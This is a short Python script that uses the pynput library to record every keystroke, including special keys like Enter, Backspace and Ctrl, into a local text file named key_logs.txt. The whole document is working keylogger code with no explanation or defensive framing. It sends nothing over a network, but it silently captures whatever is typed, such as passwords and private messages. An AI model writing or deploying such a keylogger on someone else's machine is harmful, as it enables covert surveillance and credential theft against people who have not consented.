from pynput import keyboard

log_file = "key_logs.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            if key.char:
                f.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            elif key == keyboard.Key.tab:
                f.write("[TAB]")
            elif key == keyboard.Key.shift:
                f.write("[SHIFT]")
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                f.write("[CTRL]")
            else:
                f.write(f"[{key.name.upper()}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
